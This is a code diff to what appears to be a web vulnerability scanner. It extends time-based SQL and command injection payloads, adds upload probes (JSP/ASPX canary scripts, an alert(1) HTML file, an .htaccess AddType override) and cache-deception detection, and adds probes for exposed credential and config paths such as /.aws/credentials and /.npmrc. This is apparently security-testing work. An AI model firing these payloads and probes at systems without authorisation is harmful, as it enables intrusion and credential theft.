@@ -224,6 +224,8 @@ def probe_time(ctx: Context, url: str, param: str, method: str = "GET",
 
     payloads = [
         ("mysql", f"1' AND SLEEP({delay_s})-- -"),
+        ("mysql-benchmark",
+         f"1' AND BENCHMARK({delay_s * 1_000_000},MD5(1))-- -"),
         ("postgres", f"1' AND pg_sleep({delay_s})-- -"),
         ("mssql", f"1'; WAITFOR DELAY '0:0:{delay_s}'-- -"),
         ("cmd-unix", f"1; sleep {delay_s}"),
@@ -803,6 +805,14 @@ def probe_upload(ctx: Context, url: str) -> dict:
          f"<?php /*{canary}*/ echo 'x'; ?>"),
         ("phtml", f"{canary}.phtml", "application/x-php",
          f"<?php /*{canary}*/ echo 'x'; ?>"),
+        ("jsp", f"{canary}.jsp", "application/x-jsp",
+         f"<% /*{canary}*/ out.print(\"x\"); %>"),
+        ("aspx", f"{canary}.aspx", "application/x-aspx",
+         f"<% /*{canary}*/ Response.Write(\"x\"); %>"),
+        ("html-stored", f"{canary}.html", "text/html",
+         f"<script>/*{canary}*/alert(1)</script>"),
+        ("htaccess", ".htaccess", "text/plain",
+         f"AddType application/x-httpd-php .{canary}txt"),
         ("ctype-spoof", f"{canary}.php", "image/jpeg",
          f"<?php /*{canary}*/ echo 'x'; ?>"),
     ]
@@ -967,16 +977,51 @@ def probe_cache(ctx: Context, url: str) -> dict:
                            tool="probe_cache", note="reflection check")
     clean_body = clean.get("body") or ""
     refl_body = refl.get("body") or ""
+    signals = []
     if c1 in clean_body:
-        verdict = ("cache-poisoning candidate: unkeyed X-Forwarded-Host "
-                   "persisted into a response served to a clean request")
+        signals.append("cache-poisoning candidate: unkeyed X-Forwarded-Host "
+                       "persisted into a response served to a clean request")
     elif c2 in refl_body:
-        verdict = ("X-Forwarded-Host reflected but not cached - header "
-                   "is likely keyed or no shared cache")
-    else:
-        verdict = "no cache/xfh signal"
+        signals.append("X-Forwarded-Host reflected but not cached - header "
+                       "is likely keyed or no shared cache")
+
+    # cache deception: the same page resolving under a static-extension
+    # suffix is path confusion - behind an extension-keyed CDN the
+    # private page gets cached for anyone who knows the URL
+    base_page = clean
+    dec = ctx.client.send("GET", url.rstrip("/") + f"/{_marker('cd')}.css",
+                          tool="probe_cache", note="deception .css suffix")
+    dec_body = dec.get("body") or ""
+    sim = _similarity(dec_body, base_page.get("body") or "")
+    deception = None
+    if dec["status"] == 200 and base_page.get("body") and sim > 0.9:
+        # refetch: a HIT on the second fetch means it is really cached
+        ref = ctx.client.send(
+            "GET", url.rstrip("/") + f"/{_marker('cd2')}.css",
+            tool="probe_cache", note="deception refetch")
+        cache_hdr = {k.lower(): v for k, v in
+                     (ref.get("headers") or {}).items()}
+        cache_hit = any(
+            str(v).lower() in ("hit", "hit-from-cloudfront", "tcp_hit")
+            for k, v in cache_hdr.items()
+            if k in ("x-cache", "cf-cache-status", "age", "via",
+                     "x-cache-status"))
+        deception = {"suffix_status": dec["status"],
+                     "similarity": sim,
+                     "request_id": dec["request_id"],
+                     "cache_hit_seen": cache_hit}
+        if cache_hit:
+            signals.append("cache-deception candidate: page resolves "
+                           "under .css suffix AND refetch shows a cache "
+                           "HIT - private content may be served to others")
+        else:
+            signals.append("path confusion: page resolves under .css "
+                           "suffix (deception risk behind extension-keyed "
+                           "caches)")
+    verdict = "; ".join(signals) if signals else "no cache/xfh signal"
     return {"verdict": verdict, "clean_id": clean["request_id"],
-            "reflect_id": refl["request_id"]}
+            "reflect_id": refl["request_id"],
+            "deception": deception}
 
 
 def probe_ppoll(ctx: Context, pollute_url: str, check_url: str) -> dict:
@@ -1153,6 +1198,20 @@ _DISCLOSE_PATHS: list[tuple[str, re.Pattern]] = [
     ("/.npmrc", re.compile(r"_auth|_authToken|registry=", re.I)),
     ("/.aws/credentials", re.compile(r"aws_access_key_id|aws_secret", re.I)),
     ("/health", re.compile(r'"status"\s*:\s*"(UP|ok|healthy|pass)"', re.I)),
+    ("/server-info", re.compile(r"Apache Server Information", re.I)),
+    ("/nginx_status", re.compile(r"Active connections:\s*\d+", re.I)),
+    ("/v2/api-docs", re.compile(r'"swagger"|"openapi"|"paths"\s*:', re.I)),
+    ("/actuator/mappings", re.compile(r'"dispatcherServlet"|"handler"|predicate', re.I)),
+    ("/actuator/info", re.compile(r'"build"|"git"|"app"', re.I)),
+    ("/composer.json", re.compile(r'"require"\s*:\s*\{|"autoload"', re.I)),
+    ("/package.json", re.compile(r'"(dev)?[Dd]ependencies"\s*:\s*\{', re.I)),
+    ("/web.config", re.compile(r"<configuration>|<system\.web", re.I)),
+    ("/phpmyadmin/", re.compile(r"phpMyAdmin", re.I)),
+    ("/adminer.php", re.compile(r"Adminer", re.I)),
+    ("/manager/html", re.compile(r"Tomcat|Manager Application", re.I)),
+    ("/debug/vars", re.compile(r'"cmdline"|"memstats"', re.I)),
+    ("/debug/pprof/", re.compile(r"goroutine|profile|heap", re.I)),
+    ("/.gitignore", re.compile(r"^\*?\.?[a-z_]+$|node_modules|vendor/|\.env", re.M | re.I)),
 ]
 
 
